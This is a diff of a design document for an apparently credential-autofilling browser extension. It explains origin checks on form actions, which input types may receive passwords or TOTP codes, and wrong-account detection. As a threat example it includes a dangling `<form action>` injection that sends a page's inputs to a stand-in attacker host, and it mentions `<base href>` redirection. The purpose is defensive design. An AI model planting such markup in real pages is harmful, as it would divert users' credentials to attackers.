@@ -827,45 +827,44 @@ isolated world's policy (`script-src 'self'`) refuses it, so only forms whose ha
 do the work log in, and one whose action alone signs in, such as
 `action="javascript:doLogin()"`, does not. The submitter checked for a click is the
 control the click activates: the clicked element, or the button or input it sits in, or
-the control a clicked `<label>` names. Injected markup could otherwise choose the destination: a
-dangling `<form action="https://attacker.example/">` makes the parser drop the page's
-own `<form>` start tag and take its inputs, which then submit to that action. Only the
-destination's origin is checked, not which `<form>` element holds the inputs, so a form
-the parser gives inputs outside it, as in a legacy `<table>` layout, is filled when it
-submits to the document's origin. A refused fill step is retried like any other failed
-fill and then ends the attempt `retry-limit`; a refused click ends it
+the control a clicked `<label>` names. Injected markup could otherwise choose the
+destination: a dangling `<form action="https://attacker.example/">` makes the parser
+drop the page's own `<form>` start tag and take its inputs, which then submit to that
+action. Only the destination's origin is checked, not which `<form>` element holds the
+inputs, so a form the parser gives inputs outside it, as in a legacy `<table>` layout,
+is filled when it submits to the document's origin. A refused fill step is retried like
+any other failed fill and then ends the attempt `retry-limit`; a refused click ends it
 `structural-mismatch` and moves it to reconciling, as other failed clicks do. A click on
 a control that does not submit a form, also one outside any form, is not checked here;
 when the page's script then submits a form, the only check is the one on that form's
 `action` made when a step filled inputs inside it, so an action the script changes after
-the fill, or a form no step filled, is not checked. This does not cover
-values the page's own script sends, such as with `fetch` or `XMLHttpRequest`, whose
-relative URLs an injected `<base href>` can also redirect, nor a same-origin path that
-redirects elsewhere or serves user content. A provider password goes only
-into a password input, and a TOTP code only into a one-time-code or short numeric
-input, so a recipe cannot place them in a search box. A
-Hidden custom field goes only into a password or short numeric input, and a Linked
-custom field follows the field it reads. Before a fill step that writes a secret but not
-the username (a site that remembers the account and asks only for the password), the
-background sends the selected item's username to the content script with that one fill.
-The content script compares it with the account identifiers shown in the form, or the
-page when there is no form, and the first eight `h1`-`h3` headings; every element
-boundary separates words, and `mailto:` links, `<address>` and `<footer>` are skipped as
-contact addresses. The username never leaves the content script or reaches status. An
-email username is compared with shown email addresses. A username of digits only is
-compared with masked IDs that show at least two characters (`****1234`), and only on a
-step that fills a password or Hidden field, because a one-time-code page usually shows
-the masked phone number the code was sent to. If comparable identifiers are shown and
-none fits (`myaccount@example.com` or `****9999` shown while `my2@example.com` or
-`00001234` is selected), the step fills nothing and the attempt ends `wrong-account`
-without a retry or a spent submission. A masked value consistent with the username
-(`m***@example.com`, `****1234`) proceeds, as does an item without a username, a
-username of another kind (`taro99`) or a page that shows no comparable identifier. A
-masked number that is not the account, such as a card number on a password page, still
-stops a digits-only username: a known limitation. A recipe can name an `accountSwitch`
-target: the button or `<a href>` link that switches to another account
-(`{ "by": "text", "value": "Use another account" }`; text locators match link text only
-here and in a signed-in marker; the recipe must not use it for a click step or
+the fill, or a form no step filled, is not checked. This does not cover values the
+page's own script sends, such as with `fetch` or `XMLHttpRequest`, whose relative URLs
+an injected `<base href>` can also redirect, nor a same-origin path that redirects
+elsewhere or serves user content. A provider password goes only into a password input,
+and a TOTP code only into a one-time-code or short numeric input, so a recipe cannot
+place them in a search box. A Hidden custom field goes only into a password or short
+numeric input, and a Linked custom field follows the field it reads. Before a fill step
+that writes a secret but not the username (a site that remembers the account and asks
+only for the password), the background sends the selected item's username to the content
+script with that one fill. The content script compares it with the account identifiers
+shown in the form, or the page when there is no form, and the first eight `h1`-`h3`
+headings; every element boundary separates words, and `mailto:` links, `<address>` and
+`<footer>` are skipped as contact addresses. The username never leaves the content
+script or reaches status. An email username is compared with shown email addresses. A
+username of digits only is compared with masked IDs that show at least two characters
+(`****1234`), and only on a step that fills a password or Hidden field, because a
+one-time-code page usually shows the masked phone number the code was sent to. If
+comparable identifiers are shown and none fits (`myaccount@example.com` or `****9999`
+shown while `my2@example.com` or `00001234` is selected), the step fills nothing and the
+attempt ends `wrong-account` without a retry or a spent submission. A masked value
+consistent with the username (`m***@example.com`, `****1234`) proceeds, as does an item
+without a username, a username of another kind (`taro99`) or a page that shows no
+comparable identifier. A masked number that is not the account, such as a card number on
+a password page, still stops a digits-only username: a known limitation. A recipe can
+name an `accountSwitch` target: the button or `<a href>` link that switches to another
+account (`{ "by": "text", "value": "Use another account" }`; text locators match link
+text only here and in a signed-in marker; the recipe must not use it for a click step or
 `rejection`). When the page shows another account, nothing was submitted in the attempt,
 and that target matches exactly one shown link or button that does not submit a form,
 the background first records the attempt as `account-switched` (blocked, no submission
